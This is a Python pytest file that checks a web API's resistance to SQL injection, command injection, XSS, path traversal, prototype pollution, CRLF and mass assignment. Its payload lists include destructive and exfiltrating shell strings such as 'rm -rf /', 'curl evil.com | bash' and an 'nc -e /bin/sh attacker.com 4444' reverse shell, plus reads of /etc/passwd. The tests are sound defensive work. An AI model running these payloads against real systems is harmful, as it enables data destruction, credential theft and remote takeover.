"""
Tests for injection attack prevention.

These tests verify that user input is properly sanitized
to prevent SQL injection, command injection, and other
injection attacks.
"""

import pytest
from uuid import uuid4


class TestSQLInjection:
    """Tests for SQL injection prevention."""

    SQL_INJECTION_PAYLOADS = [
        "'; DROP TABLE scans; --",
        "1 OR 1=1",
        "1; DELETE FROM users; --",
        "1 UNION SELECT * FROM users",
        "' OR '1'='1",
        "admin'--",
        "1'; WAITFOR DELAY '0:0:5'--",
        "1; SELECT pg_sleep(5)--",
    ]

    async def test_target_name_sql_injection(self, test_client):
        """SQL injection in target name should be stored as literal text, not executed."""
        for payload in self.SQL_INJECTION_PAYLOADS:
            response = await test_client.post(
                "/api/targets",
                json={
                    "name": payload,
                    "adapter": "filesystem",
                    "config": {"path": "/test"},
                },
            )
            # Should either succeed (201) or fail with validation error (400/422)
            # Should NEVER cause server error (500)
            assert response.status_code in (200, 201, 400, 422), \
                f"Unexpected status {response.status_code} for SQL payload: {payload}"

            if response.status_code in (200, 201):
                # If stored, verify the payload was stored as literal text (not executed)
                target_data = response.json()
                assert target_data["name"] == payload, \
                    f"SQL payload was modified on storage: expected {payload!r}, got {target_data['name']!r}"

                # Fetch it back and verify it's returned verbatim
                target_id = target_data["id"]
                get_response = await test_client.get(f"/api/targets/{target_id}")
                assert get_response.status_code == 200
                assert get_response.json()["name"] == payload, \
                    "SQL payload was not preserved as literal text on retrieval"

    async def test_search_query_sql_injection(self, test_client):
        """SQL injection in search queries should not cause errors or data leakage."""
        # First, create a known target so we know what should NOT leak
        create_resp = await test_client.post(
            "/api/targets",
            json={
                "name": "Canary Target For SQLi Test",
                "adapter": "filesystem",
                "config": {"path": "/test-sqli-canary"},
            },
        )
        assert create_resp.status_code in (200, 201)

        for payload in self.SQL_INJECTION_PAYLOADS:
            # Test in various query parameters
            response = await test_client.get(
                "/api/results",
                params={"search": payload},
            )
            # Should return 200 (with results) or 422 (validation error)
            # Should NEVER cause 500
            assert response.status_code in (200, 400, 422), \
                f"Unexpected status {response.status_code} for SQL payload in search: {payload}"

            response = await test_client.get(
                "/api/scans",
                params={"filter": payload},
            )
            assert response.status_code in (200, 400, 422), \
                f"Unexpected status {response.status_code} for SQL payload in filter: {payload}"

    async def test_uuid_parameter_sql_injection(self, test_client):
        """SQL injection in UUID parameters should return 404 or 422, never 500."""
        for payload in self.SQL_INJECTION_PAYLOADS:
            # UUID parameters should be validated as UUIDs and rejected
            response = await test_client.get(f"/api/scans/{payload}")
            assert response.status_code in (404, 422), \
                f"UUID endpoint accepted non-UUID: status {response.status_code} for payload: {payload}"

            # Also test against targets and results endpoints
            response = await test_client.get(f"/api/targets/{payload}")
            assert response.status_code in (404, 422), \
                f"UUID endpoint accepted non-UUID: status {response.status_code} for payload: {payload}"

            response = await test_client.get(f"/api/results/{payload}")
            assert response.status_code in (404, 422), \
                f"UUID endpoint accepted non-UUID: status {response.status_code} for payload: {payload}"

    async def test_sql_injection_does_not_leak_other_tenants_data(self, test_client):
        """SQL injection payloads must not cause data from other contexts to leak."""
        union_payloads = [
            "1 UNION SELECT * FROM users",
            "' OR '1'='1",
            "1 OR 1=1",
        ]
        for payload in union_payloads:
            response = await test_client.get(
                "/api/results",
                params={"search": payload},
            )
            if response.status_code == 200:
                data = response.json()
                items = data.get("items", [])
                # A UNION injection returning all data would yield unexpected results.
                # With proper parameterized queries, the payload is treated as literal
                # text and should match nothing.
                for item in items:
                    # Verify each returned item has expected structure, not raw DB rows
                    assert "id" in item, "Result item missing 'id' field"
                    assert "file_path" in item or "risk_score" in item, \
                        "Result has unexpected structure suggesting SQL injection leak"


class TestCommandInjection:
    """Tests for command injection prevention."""

    COMMAND_INJECTION_PAYLOADS = [
        "/tmp/file; rm -rf /",
        "/tmp/file | cat /etc/passwd",
        "/tmp/file`whoami`",
        "/tmp/file$(id)",
        "/tmp/file && wget evil.com/shell.sh",
        "/tmp/$(touch /tmp/pwned)",
        "/tmp/file; curl evil.com | bash",
        "| nc -e /bin/sh attacker.com 4444",
    ]

    async def test_target_path_command_injection(self, test_client):
        """Command injection in target paths should be rejected by path validation."""
        for payload in self.COMMAND_INJECTION_PAYLOADS:
            response = await test_client.post(
                "/api/targets",
                json={
                    "name": "Malicious Target",
                    "adapter": "filesystem",
                    "config": {"path": payload},
                },
            )
            # Paths with shell metacharacters (;, |, $, `, &&) should be
            # rejected by the BLOCKED_SCAN_PATH_PATTERNS regex or blocked
            # path prefixes. Accept 400 (validation) or 403 (blocked path).
            assert response.status_code in (400, 403, 422), \
                f"Command injection payload was accepted (status {response.status_code}): {payload}"

    async def test_filename_command_injection(self, test_client):
        """Command injection in filenames should be prevented."""
        for payload in self.COMMAND_INJECTION_PAYLOADS:
            # Test in search/filter that might be used in file operations
            response = await test_client.get(
                "/api/results",
                params={"file_name": payload},
            )
            # Should be safely handled -- never 500
            assert response.status_code in (200, 400, 422), \
                f"Command injection in filename caused error (status {response.status_code}): {payload}"


class TestXSSPrevention:
    """Tests for Cross-Site Scripting (XSS) prevention."""

    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "'-alert('XSS')-'",
        "<body onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'>",
    ]

    async def test_target_name_xss_stored(self, test_client):
        """XSS payloads in target names should be safely stored and returned as JSON data."""
        for payload in self.XSS_PAYLOADS:
            # Create target with XSS payload
            response = await test_client.post(
                "/api/targets",
                json={
                    "name": payload,
                    "adapter": "filesystem",
                    "config": {"path": "/test"},
                },
            )

            assert response.status_code in (200, 201, 400, 422), \
                f"Unexpected status {response.status_code} for XSS payload: {payload}"

            if response.status_code in (200, 201):
                # Verify Content-Type is JSON (not text/html)
                content_type = response.headers.get("content-type", "")
                assert "application/json" in content_type, \
                    f"Response should be JSON to prevent XSS execution, got: {content_type}"

                # Verify the payload is stored as literal text, not transformed
                target_data = response.json()
                assert target_data["name"] == payload, \
                    f"XSS payload was altered: expected {payload!r}, got {target_data['name']!r}"

                # Fetch and verify it's returned verbatim as JSON
                target_id = target_data["id"]
                get_response = await test_client.get(f"/api/targets/{target_id}")
                assert get_response.status_code == 200
                get_content_type = get_response.headers.get("content-type", "")
                assert "application/json" in get_content_type, \
                    f"GET response should be JSON, got: {get_content_type}"
                assert get_response.json()["name"] == payload, \
                    "XSS payload was not preserved as literal text on retrieval"

    async def test_api_returns_json_content_type(self, test_client):
        """All API responses must have JSON content type to prevent XSS."""
        endpoints = [
            "/api/targets",
            "/api/scans",
            "/api/results",
            "/api/dashboard/stats",
        ]

        for endpoint in endpoints:
            response = await test_client.get(endpoint)
            assert response.status_code == 200, \
                f"Endpoint {endpoint} returned {response.status_code}, expected 200"
            content_type = response.headers.get("content-type", "")
            assert "application/json" in content_type, \
                f"Endpoint {endpoint} should return JSON, got {content_type}"


class TestPathTraversalInAPI:
    """Tests for path traversal in API parameters."""

    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/passwd",
        "....//....//....//etc/passwd",
    ]

    async def test_target_config_path_traversal(self, test_client):
        """Path traversal in target config should be rejected."""
        for payload in self.PATH_TRAVERSAL_PAYLOADS:
            response = await test_client.post(
                "/api/targets",
                json={
                    "name": "Traversal Target",
                    "adapter": "filesystem",
                    "config": {"path": payload},
                },
            )
            # Path traversal attempts MUST be rejected. The targets route uses
            # validate_filesystem_target_config which checks BLOCKED_SCAN_PATH_PATTERNS
            # (for ..) and BLOCKED_SCAN_PATH_PREFIXES (for /etc, etc.)
            assert response.status_code in (400, 403), \
                f"Path traversal payload was NOT rejected (status {response.status_code}): {payload}"


class TestJSONInjection:
    """Tests for JSON injection attacks."""

    async def test_json_pollution_in_config(self, test_client):
        """JSON pollution attacks in config should not affect application state."""
        pollution_payloads = [
            {"__proto__": {"admin": True}},
            {"constructor": {"prototype": {"admin": True}}},
            {"path": "/test", "__proto__": {"isAdmin": True}},
        ]

        for payload in pollution_payloads:
            response = await test_client.post(
                "/api/targets",
                json={
                    "name": "Pollution Target",
                    "adapter": "filesystem",
                    "config": payload,
                },
            )
            # Python/SQLAlchemy is not vulnerable to prototype pollution.
            # The request may be accepted (if config has "path") or rejected (if not).
            if "path" in payload:
                assert response.status_code in (200, 201, 400, 422), \
                    f"Unexpected status {response.status_code} for payload with path key"
            else:
                # No 'path' key -> filesystem validation should reject
                assert response.status_code == 400, \
                    f"Config without 'path' should be rejected with 400, got {response.status_code}"

    async def test_deeply_nested_json(self, test_client):
        """Deeply nested JSON should not cause stack overflow or server crash."""
        # Create deeply nested JSON (potential DoS)
        nested = {"a": "b"}
        for _ in range(100):
            nested = {"nested": nested}

        response = await test_client.post(
            "/api/targets",
            json={
                "name": "Deep Nested Target",
                "adapter": "filesystem",
                "config": nested,
            },
        )
        # Should either succeed or fail with validation error.
        # NEVER 500 (server crash = DoS vulnerability).
        assert response.status_code != 500, \
            "Deep nesting caused server error (500) - potential DoS vulnerability"
        assert response.status_code in (200, 201, 400, 413, 422), \
            f"Unexpected status {response.status_code} for deeply nested JSON"


class TestHeaderInjection:
    """Tests for HTTP header injection."""

    async def test_crlf_in_redirect_parameter(self, test_client):
        """CRLF injection in redirect parameters should be prevented."""
        crlf_payloads = [
            "http://example.com%0d%0aSet-Cookie:%20malicious=value",
            "http://example.com\r\nX-Injected: header",
            "/path%0d%0aX-Injected:%20header",
        ]

        for payload in crlf_payloads:
            # Test auth callback redirect
            response = await test_client.get(
                "/api/auth/callback",
                params={"redirect": payload},
                follow_redirects=False,
            )
            # Response headers should not contain injected headers
            assert "X-Injected" not in response.headers, \
                f"CRLF injection succeeded in adding header with payload: {payload}"
            assert "malicious=value" not in response.headers.get("set-cookie", ""), \
                f"CRLF injection succeeded in setting cookie with payload: {payload}"


class TestMassAssignment:
    """Tests for mass assignment vulnerabilities."""

    async def test_cannot_set_tenant_id_via_api(self, test_client):
        """Users should not be able to set tenant_id via API."""
        other_tenant_id = str(uuid4())

        response = await test_client.post(
            "/api/targets",
            json={
                "name": "Mass Assignment Test Target",
                "adapter": "filesystem",
                "config": {"path": "/test"},
                "tenant_id": other_tenant_id,  # Try to set different tenant
            },
        )

        # TargetCreate schema only has name/adapter/config fields.
        # Extra fields like tenant_id should be ignored by Pydantic.
        # The target should be created successfully with the authenticated user's tenant.
        assert response.status_code in (200, 201), \
            f"Expected target creation to succeed, got {response.status_code}"

        target_data = response.json()
        # tenant_id is not exposed in TargetResponse, so we verify by fetching
        # the target back. If it was created under the wrong tenant, the current
        # user wouldn't be able to see it (would get 404).
        target_id = target_data["id"]
        get_response = await test_client.get(f"/api/targets/{target_id}")
        assert get_response.status_code == 200, \
            "Target not accessible by authenticated user - may have been assigned to wrong tenant!"

    async def test_cannot_set_id_via_api(self, test_client):
        """Users should not be able to set resource id via API."""
        malicious_id = str(uuid4())

        response = await test_client.post(
            "/api/targets",
            json={
                "name": "ID Injection Test Target",
                "adapter": "filesystem",
                "config": {"path": "/test"},
                "id": malicious_id,  # Try to set specific ID
            },
        )

        # Should succeed (extra fields ignored) or be rejected
        assert response.status_code in (200, 201, 400, 422), \
            f"Unexpected status code: {response.status_code}"

        if response.status_code in (200, 201):
            target_data = response.json()
            returned_id = target_data.get("id")
            assert returned_id is not None, "Response should include server-generated ID"
            assert returned_id != malicious_id, \
                "Mass assignment vulnerability: server accepted client-provided ID!"

    async def test_cannot_set_created_by_via_api(self, test_client):
        """Users should not be able to override created_by field."""
        fake_user_id = str(uuid4())

        response = await test_client.post(
            "/api/targets",
            json={
                "name": "Created-By Injection Test",
                "adapter": "filesystem",
                "config": {"path": "/test"},
                "created_by": fake_user_id,
            },
        )

        # Should succeed with the authenticated user as creator (extra fields ignored)
        assert response.status_code in (200, 201, 400, 422), \
            f"Unexpected status code: {response.status_code}"
